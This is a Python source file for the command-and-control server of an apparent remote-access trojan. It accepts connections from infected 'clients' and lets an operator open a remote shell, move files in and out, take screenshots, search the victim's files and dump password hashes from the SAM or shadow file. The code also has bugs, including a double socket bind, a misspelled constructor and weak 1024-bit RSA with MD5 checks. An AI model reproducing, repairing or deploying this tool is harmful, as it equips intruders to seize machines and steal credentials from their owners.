import socket
from threading import Thread
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome import Random
from hashlib import md5
import logging
from select import poll, POLLPRI, POLLIN
from .Client import Client
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit import print_formatted_text as print, HTML
from os.path import join, basename
from os import getcwd
from datetime import datetime


RSA_SIZE = 1024
MD5_SIZE = 16
MAXIMUM_CLIENTS = 10
EOT = '\r\n'

class BaseServer:

    logo = [
        "█▀▄▀█ █▀▀█ ▀▀█▀▀ █░░█ █▀▀ █▀▀█ █▀▀ █░░█ ░▀░ █▀▀█",
        HTML("<ansiblue>█░▀░█ █░░█ ░░█░░ █▀▀█ █▀▀ █▄▄▀ ▀▀█ █▀▀█ ▀█▀ █░░█</ansiblue>"),
        HTML("<ansired>▀░░░▀ ▀▀▀▀ ░░▀░░ ▀░░▀ ▀▀▀ ▀░▀▀ ▀▀▀ ▀░░▀ ▀▀▀ █▀▀▀</ansired>")
    ]

    running = False

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((host, port))
        self.public_key = None
        self.private_key = None
        self._generate_keys()
        self.running = False
        self.prompt = PromptSession()
        self.selected_client = None

    def _generate_keys(self):
        random = Random.new().read
        rsa_key = RSA.generate(RSA_SIZE, random)
        self.public_key = rsa_key.public_key().exportKey()
        self.private_key = rsa_key.exportKey()

    @classmethod
    def print_logo(cls):
        for line in cls.logo:
            print(line)

    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen()

    def stop(self):
        self.running = False

    @staticmethod
    def help_cmd():
        print("""
        HELP COMMAND:
            help: display available commands.
            shell: open shell on client machine.
            download: retrieve file on client machine.
            upload: send file on server machine to client machine.
            ipconfig: retrieve the network configuration of the client machine.
            screenshot: take a screenshot of the client machine.
            search: search for a file on client machine.
            hashdump: retrieve SAM base or shadow file on client machine.
            select: select client to exchange command with.
            clients: display connected clients.
        """)

    @staticmethod
    def shell_cmd(server, _):
        if server.selected_client is None:
            print('error: no client selected')
        server.selected_client.send_message('shell')
        while True:
            try:
                cmd = server.prompt.prompt('$> ')
            except KeyboardInterrupt:
                break
            server.selected_client.send_message(cmd)
            if cmd == 'exit':
                break
            while True:
                output = server.selected_client.receive_message()
                if output.endswith('\n\n'):
                    print(output.rstrip())
                    break
                print(output.rstrip())

    @staticmethod
    def select_cmd(server, cmd_line):
        if len(cmd_line) != 2:
            print('error: usage: select <client id>')
            return
        target_id = int(cmd_line[1])
        for client in server.clients:
            if client.client_id == target_id:
                server.selected_client = client
                return
        print(f'error: unknown client {target_id}')

    @staticmethod
    def clients_cmd(server, _):
        if len(server.clients) < 1:
            print('info: no available client')
        for client in server.clients:
            print(f'client: hostname({client.hostname}), id({client.client_id})')

    @staticmethod
    def screenshot_cmd(server, _):
        server.selected_client.send_message('screenshot')
        file_dir = getcwd()
        filename = f'screenshot_{datetime.now().strftime("%y%m%d_%H%M%S")}.png'
        filepath = join(file_dir, filename)
        server.selected_client.receive_file(filepath, binary_mode=True)

    @staticmethod
    def download_cmd(server, cmds):
        server.selected_client.send_message(f'download {cmds[1]}')
        filename = basename(cmds[1])
        server.selected_client.receive_file(filename, binary_mode=True)

    @staticmethod
    def upload_cmd(server, cmds):
        filename = basename(cmds[1])
        server.selected_client.send_message(f'upload {filename}')
        server.selected_client.send_file(cmds[1])

    @staticmethod
    def search_cmd(server, cmds):
        server.selected_client.send_message(f'search {cmds[1]}')
        msg = server.selected_client.receive_message()
        print(msg)

    @staticmethod
    def ipconfig_cmd(server, _):
        server.selected_client.send_message('ipconfig')
        config = ''
        while True:
            msg = server.selected_client.receive_message()
            if msg.endswith(EOT):
                config += msg[:-2]
                break
            config += msg
        print(config, end='')

    @staticmethod
    def hashdump_cmd(server, _):
        server.selected_client.send_message('hashdump')
        while True:
            msg = server.selected_client.receive_message()
            if msg.endswith(EOT):
                print(msg)
                break
            print(msg)

    cmds_table = {
        'help': help_cmd,
        'shell': shell_cmd,
        'select': select_cmd,
        'clients': clients_cmd,
        'screenshot': screenshot_cmd,
        'download': download_cmd,
        'upload': upload_cmd,
        'search': search_cmd,
        'ipconfig': ipconfig_cmd,
        'hashdump': hashdump_cmd
    }


def check_hash(digest, msg):
    if md5(msg).hexdigest() == digest:
        return True
    return False


class ServerLinux(BaseServer):

    def __int__(self, host, port, secure=True):
        super().__init__(host, port)

    def secure_connection_protocol(self, client: Client):
        # send src public key with hash digest
        client.send_message(f'{self.public_key.hex()}:{md5(self.public_key).hexdigest()}')
        # receive the client public key with the hex digest
        client_msg = client.receive_message(RSA_SIZE + MD5_SIZE)
        client_pub_key, digest = client_msg.split(':')
        if not check_hash(digest, client_pub_key.encode()):
            logging.error(f'[MESSAGE MODIFIED]: received a modified message with client')
            return False
        # generate random IV for AES CBC block mode
        rdm_iv = Random.get_random_bytes(AES.block_size)
        rdm_key = Random.get_random_bytes(AES.block_size)
        # create AES key
        # encrypt the AES key with the client public key
        client_pub_key = RSA.import_key(client_pub_key)
        cipher_rsa = PKCS1_OAEP.new(client_pub_key)
        enc_aes_key = cipher_rsa.encrypt(rdm_key)
        # send the AES key, random IV, key digest, IV digest
        # 16 bytes + 16 bytes + 16 bytes + 16 bytes
        client.send_message(f'{enc_aes_key.hex()}:{rdm_iv.hex()}:{md5(enc_aes_key).hexdigest()}:{md5(rdm_iv).hexdigest()}')
        client.init_encryption(rdm_key, rdm_iv, first=False)
        client_check_msg = client.receive_message()
        if not client_check_msg.startswith("HELLO"):
            logging.error('[SECURE CONNECTION FAILED]')
            return False
        client.hostname = client_check_msg.split(' ')[1]
        return True

    def accept_clients(self):
        self.server_socket.listen(MAXIMUM_CLIENTS)
        poller = poll()
        poller.register(self.server_socket)
        fd_to_socket = {self.server_socket.fileno(): self.server_socket}
        track_id = 1
        while self.running:
            events = poller.poll(1000)
            for fd, flag in events:
                event_socket = fd_to_socket[fd]
                if (flag & (POLLIN | POLLPRI)) and event_socket is self.server_socket:
                    client_socket, addr = self.server_socket.accept()
                    client = Client()
                    client.set_socket(client_socket)
                    if self.secure_connection_protocol(client):
                        client.client_id = track_id
                        track_id += 1
                        print(f'[CLIENT CONNECTED]: {addr[0]}:{addr[1]} ({client.hostname}) id({client.client_id})')
                        self.clients.append(client)

    def read_user_input(self):
        while self.running:
            prefix = f'{"$> " if self.selected_client is None else f"({self.selected_client.hostname}) $> "}'
            try:
                cmd = self.prompt.prompt(HTML(f'<ansiblue>{prefix}</ansiblue>'))
            except KeyboardInterrupt:
                break
            else:
                cmd = cmd.split(' ')
                if cmd[0] in BaseServer.cmds_table:
                    BaseServer.cmds_table[cmd[0]](self, cmd)
                else:
                    print(f'error: unknown command {cmd[0]}')

    def run(self):
        self.running = True
        Thread(target=self.accept_clients, daemon=True).start()
        self.print_logo()
        print('')
        with patch_stdout():
            self.read_user_input()
